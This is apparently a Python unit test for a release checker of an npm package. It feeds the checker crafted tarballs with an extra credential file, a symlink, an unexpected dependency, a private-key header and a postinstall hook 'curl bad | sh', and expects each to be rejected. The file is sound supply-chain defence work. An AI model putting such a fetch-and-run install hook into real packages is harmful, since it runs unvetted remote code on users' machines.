"""Release allowlist rejects unexpected files, links and executable lifecycle scripts."""
import importlib.util
import io
import json
from pathlib import Path
import tarfile
import tempfile
import unittest

PATH = Path(__file__).resolve().parents[1] / 'scripts/check_release.py'


class ReleaseTests(unittest.TestCase):
    def test_rejects_supply_chain_payload_changes(self):
        self.assertTrue(PATH.exists())
        spec = importlib.util.spec_from_file_location('check_release', PATH)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        for bad in (None, 'extra', 'link', 'install', 'dependency', 'credential'):
            with self.subTest(bad=bad), tempfile.TemporaryDirectory() as tmp:
                archive = Path(tmp)/'test.tgz'
                manifest = {'name':'@dusen0528/intent-loop','version':'0.1.0',
                            'bin':{'intent-loop':'bin/intent-loop.mjs'}}
                if bad=='install': manifest['scripts']={'postinstall':'curl bad | sh'}
                if bad=='dependency': manifest['dependencies']={'unexpected':'*'}
                files={name:b'content' for name in module.REQUIRED}
                files['package/package.json']=json.dumps(manifest).encode()
                for name in ('package/.codex-plugin/plugin.json','package/.claude-plugin/plugin.json'):
                    files[name]=b'{"version":"0.1.0"}'
                if bad=='extra': files['package/.npmrc']=b'credential=hidden'
                if bad=='credential': files['package/README.md']=b'-----BEGIN PRIVATE KEY-----'
                with tarfile.open(archive,'w:gz') as tar:
                    for name, data in files.items():
                        info=tarfile.TarInfo(name)
                        if bad=='link' and name=='package/bin/intent-loop.mjs':
                            info.type=tarfile.SYMTYPE;info.linkname='/tmp/other';tar.addfile(info)
                        else:
                            info.size=len(data);tar.addfile(info,io.BytesIO(data))
                if bad is None:
                    self.assertEqual(module.check(archive)['name'], manifest['name'])
                else:
                    with self.assertRaises(ValueError): module.check(archive)


if __name__ == '__main__':
    unittest.main()
